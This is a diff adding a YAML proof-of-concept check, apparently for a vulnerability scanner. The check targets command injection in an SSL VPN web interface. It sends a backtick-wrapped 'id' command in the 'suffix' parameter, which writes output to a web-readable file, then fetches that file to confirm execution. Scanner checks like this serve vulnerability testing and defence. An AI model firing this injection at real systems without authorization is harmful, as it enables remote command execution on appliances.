@@ -1,0 +1,12 @@
+name: poc-yaml-sslvpn-suffix-rce
+rules:
+  - method: GET
+    path: "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60id+%3E/usr/local/webui/frrgkquigh.txt%60"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"success")
+  - method: GET
+    path: "/frrgkquigh.txt"
+    expression: |
+      response.status == 200
+detail:
+  author: 666
